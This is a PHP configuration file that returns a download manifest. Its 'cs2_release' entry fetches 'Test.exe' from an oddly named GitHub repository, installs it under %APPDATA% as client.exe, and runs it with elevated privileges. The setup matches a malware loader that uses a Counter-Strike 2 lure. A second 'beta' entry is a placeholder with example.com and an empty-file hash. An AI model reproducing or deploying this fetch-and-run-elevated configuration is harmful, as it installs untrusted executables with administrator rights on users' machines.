<?php
declare(strict_types=1);

return [
    'cs2_release' => [
        [
            'name' => 'Test.exe',
            'url' => 'https://github.com/Forokong839/JFKKKKw23445/releases/download/Realese/Test.exe',
            'sha256' => '2e3d18f2d1e3ad51f68021c91812902b0f20634d77cee7a198cae31d3a9bc09a',
            'target' => '%APPDATA%\\Client\\client.exe',
            'run' => true,
            'elevated' => true
        ]
    ],
    'beta_channel' => [
        [
            'name' => 'client_beta.exe',
            'url' => 'https://example.com/downloads/client_beta.exe',
            'sha256' => 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
            'target' => '%APPDATA%\\ClientBeta\\client_beta.exe',
            'run' => true,
            'elevated' => false
        ]
    ]
];
